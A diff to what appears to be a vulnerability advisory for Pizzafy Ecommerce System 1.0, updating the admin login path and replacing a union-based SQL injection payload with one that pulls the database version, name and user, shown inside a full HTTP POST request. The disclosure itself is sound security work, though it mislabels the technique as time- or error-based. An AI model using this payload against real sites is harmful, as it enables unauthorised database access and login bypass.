@@ -8,7 +8,7 @@
 - **Status:** Unpatched  
 
 ## **Vulnerable Endpoint:**  
-- `POST /pizza/admin/ajax.php?action=login2`
+- `POST /pizzafy/admin/ajax.php?action=login2`
 
 ## **Overview**
 The Pizzafy Ecommerce System 1.0 contains critical SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.
@@ -75,7 +75,7 @@ This attack relies on **Error-based SQL injection technique**, where the attacke
 Below is a **POST** request demonstrating the vulnerability using a **time-based SQL injection payload**:  
 
 ```
-POST /pizza/admin/ajax.php?action=login2 HTTP/1.1
+POST /pizzafy/admin/ajax.php?action=login2 HTTP/1.1
 Host: localhost
 Content-Length: 54
 sec-ch-ua: 
@@ -89,13 +89,13 @@ Origin: http://localhost
 Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: cors
 Sec-Fetch-Dest: empty
-Referer: http://localhost/pizza/index.php
+Referer: http://localhost/pizzafy/index.php
 Accept-Encoding: gzip, deflate
 Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
 Cookie: PHPSESSID=ifhk52o8akrt2j78pkbcg9d649
 Connection: close
 
-email=-1' union select 1,2,3,4,5,6,7%23&password=teste
+email=-3' union select 1,version(),database(),user(),5,6,7%23&password=teste
 
 ```
 
@@ -103,7 +103,7 @@ email=-1' union select 1,2,3,4,5,6,7%23&password=teste
 This payload injects the SQL command:  
 
 ```sql
-email=-1' union select 1,2,3,4,5,6,7%23&password=teste
+email=-3' union select 1,version(),database(),user(),5,6,7%23&password=teste
 ```
 This makes it possible to get data from the database.
 
@@ -111,7 +111,7 @@ This makes it possible to get data from the database.
 
 ## Image
 
-- ![](https://i.imgur.com/udUyIPi.png)
+- ![](https://i.imgur.com/TAHGm4M.png)
 ---
 
 ## Remediation
